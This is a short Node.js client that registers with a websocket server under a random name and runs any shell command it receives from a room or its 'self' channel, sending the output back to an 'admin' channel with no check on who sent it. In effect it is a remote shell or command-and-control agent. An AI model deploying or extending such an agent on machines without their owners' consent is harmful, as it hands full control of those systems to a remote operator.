const { spawn } = require('child_process')
const fs = require('fs');
const fetch = require('node-fetch');

const socket = require('./wsclient.js');

socket.connect().then(async () => {

    const config = JSON.parse(fs.readFileSync('config.json'));

    if (!config.name) {
        const url = 'http://localhost:4200'; // will change after it goes to production
        const res = await fetch(`${url}/randomname`);
        const data = await res.json();
        config.name = data.name;
        fs.writeFileSync('config.json', JSON.stringify(config));
    };

    socket.emit('server', {
        action: 'set name',
        name: config.name,
    });

    socket.join(config.room, async (data, sender) => executeCommand(data));
    socket.join('self', async (data, sender) => executeCommand(data));
});

function executeCommand(data) {
    if (data.action && data.action == 'execute') {
        const res = spawn(data.command, [], { shell: true });
        
        res.stdout.on('data', data => {
            socket.emit('admin', { action: 'command', response: data.toString() });
        });
        res.stderr.on('data', data => {
            socket.emit('admin', { action: 'command', response: data.toString() });
        });
    }
    return true;
}

socket.run();